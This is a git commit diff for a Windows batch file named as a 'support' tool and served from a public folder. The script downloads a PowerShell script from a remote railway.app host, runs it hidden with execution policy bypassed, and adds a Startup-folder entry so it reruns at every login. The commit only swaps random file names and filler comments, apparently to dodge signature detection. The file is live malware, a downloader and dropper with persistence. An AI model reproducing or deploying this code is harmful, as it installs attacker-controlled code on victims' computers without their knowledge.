1314dc4c25256e2832dfb0acebe1c0ec6612c4fb
nothing <nothing>
2026-06-03 04:44:56 -0300

    New bat with AES encryption 3E34B93A7101

--- public/support_3E34B93A7101.bat
+++ public/support_3E34B93A7101.bat
@@ -1,29 +1,29 @@
 @echo off
-REM Ver706
+REM Ver809
 setlocal EnableDelayedExpansion
-REM Ver213
-REM Mod469
+REM Ver349
+REM Mod774
 
-REM [ddb345d1eae72e39a347204a9f3d2fb4]
+REM [7c1b59a7230bf333c4071f6197109324]
 
-set "fp=%LOCALAPPDATA%\2df0ea30ef"
-set "fn=609c4d9566.ps1"
+set "fp=%LOCALAPPDATA%\9abbde22d6"
+set "fn=176f928e72.ps1"
 set "ur=https://web-production-9d7cc.up.railway.app/client.ps1"
 
-REM Proc219
+REM Proc510
 if not exist "%fp%" mkdir "%fp%"
 
-REM Sys429
+REM Sys490
 powershell -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%ur%','%fp%\%fn%');Start-Process powershell -ArgumentList '-w hidden -ep bypass -f %fp%\%fn%' -WindowStyle Hidden"
 
-REM Core529
+REM Core973
 set "su=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-if not exist "%su%\1646cc.bat" (
-    echo @echo off> "%su%\1646cc.bat"
-    echo powershell -w hidden -ep bypass -f "%fp%\%fn%">> "%su%\1646cc.bat"
+if not exist "%su%\fd23e7.bat" (
+    echo @echo off> "%su%\fd23e7.bat"
+    echo powershell -w hidden -ep bypass -f "%fp%\%fn%">> "%su%\fd23e7.bat"
 )
 
-REM Core698
+REM Core415
 exit /b 0
 
-REM [4F50F3E534269C61EFE06E45]
+REM [430DB3B9FB4C950537CFECAB]
